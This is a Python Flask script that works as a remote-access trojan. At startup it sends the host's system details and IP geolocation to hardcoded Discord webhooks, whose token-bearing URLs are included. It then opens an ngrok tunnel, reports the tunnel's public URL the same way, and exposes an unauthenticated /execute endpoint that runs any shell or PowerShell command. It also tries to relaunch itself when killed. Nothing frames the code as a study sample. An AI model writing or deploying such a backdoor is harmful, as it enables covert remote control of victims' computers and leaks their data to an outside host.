from flask import Flask, request, jsonify
import random
import json
import socket
import os
import platform
import requests
import subprocess
import time
import dhooks
from dhooks import *
import signal
import sys

app = Flask(__name__)

if platform.system() == 'Linux':
    os.system("clear")
else:
    os.system("cls")

username = "ArcticHonour_test"
hook_url = "https://discord.com/api/webhooks/1283829399132573798/BQYGDwoOEfz7_PC1eSzmqO8BmkbAZwm0RmRgAXTC7Uisq3E4u2w5CMSaxkiF3Jeh0fBM"
live_execute = "https://discord.com/api/webhooks/1307686709886062683/UQStVdOK09gUHktWxXt1x6gVYIy_q6Sb2OWM0smEbzWr_mDUibQx-f-TK5etnr7FbQ0M"
hook2 = Webhook(live_execute)
hook = Webhook(hook_url)

current_directory = os.getcwd()

def start_ngrok():
    try:
        ngrok_process = subprocess.Popen(['ngrok', 'http', '8080'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        hook.send("```Waiting for ngrok to start...```")
        time.sleep(10)
    except:
        print("ngrok not found or not connected to the internet")
    try:
        response = requests.get('http://localhost:4040/api/tunnels')
        tunnels = response.json().get('tunnels', [])
        if tunnels:
            public_url = tunnels[0]['public_url']
            hook.send(f"```json\n{public_url}\n```")
            return public_url, ngrok_process
        else:
            hook.send("No tunnels found.")
            ngrok_process.terminate()
            return None, ngrok_process
    except Exception as e:
        hook.send(f"Error retrieving public URL: {e}")
        ngrok_process.terminate()
        return None, ngrok_process

def gather_system_info():
    try:
        response = requests.get("http://ip-api.com/json/?fields=61439")
        ip_data = response.json()
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        public_ip = ip_data.get('query', 'N/A')
    
        system_data = platform.uname()
        system_info = {
            "Node": system_data.node,
            "System": system_data.system,
            "Machine": system_data.machine,
            "Release": system_data.release,
            "Version": system_data.version,
            "Local IP": local_ip
        }
    
        hook.send(f"```json\n{json.dumps(system_info, indent=4)}\n```")
        hook.send(f"```json\n{json.dumps(ip_data, indent=4)}\n```")
        return public_ip, ip_data, system_info
    except:
        print("Failed to connect to the Internet")

gather_system_info()
ngrok_url, ngrok_process = start_ngrok()
time.sleep(5)

@app.route('/execute', methods=['POST'])
def execute_command():
    data = request.get_json()
    command = data.get('command', '')

    global current_directory

    try:
        if command.lower().startswith("cd "):
            new_dir = command.split(" ", 1)[1]
            try:
                os.chdir(new_dir)
                current_directory = os.getcwd()
                return jsonify({'result': f"Changed directory to {current_directory}"})
            except FileNotFoundError:
                return jsonify({'error': f"No such file or directory: '{new_dir}'"}), 404
            except PermissionError:
                return jsonify({'error': f"Permission denied: '{new_dir}'"}), 403
        
        # Handle python3 script execution
        elif command.lower().startswith("python3 "):
            scripty = command.split(" ", 1)[1]
            try:
                process = subprocess.Popen(['python3', scripty], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate()
                if process.returncode == 0:
                    return jsonify({'result': stdout.strip()})
                else:
                    return jsonify({'error': stderr.strip()}), 400
            except Exception as e:
                return jsonify({'error': f"Failed to execute script: {str(e)}"}), 500
        
        # Handle general commands
        if platform.system() == 'Windows':
            result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, cwd=current_directory)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_directory)
        
        # Prepare response
        if result.returncode == 0:
            return jsonify({'result': result.stdout.strip()})
        else:
            return jsonify({'error': result.stderr.strip()}), 400

    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
@app.route('/update_username', methods=['POST'])
def update_username():
    global username
    new_username = request.json.get('username')
    if new_username:
        username = new_username
        return jsonify({"message": "Username updated", "new_username": username}), 200
    return jsonify({"message": "Username not provided"}), 400

@app.route('/get_username', methods=['GET'])
def get_username():
    return jsonify({"username": username}), 200

@app.route('/operating_system', methods=['GET'])
def get_operating_system():
    try:
        operating_system = platform.system()
        return jsonify({"OPERATING_SYSTEM": operating_system}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/pwd', methods=['GET'])
def get_pwd():
    current_directory = os.getcwd()  
    return jsonify({"current_dir": current_directory}), 200

def cleanup(signum, frame):
    hook.send(f"```{username} is offline.```")
    try:
        hook.send("Trying to bring ", username ,"online")
        os.system("python3 app.py")
    except:
        hook.send("Failure...")
    ngrok_process.terminate()
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
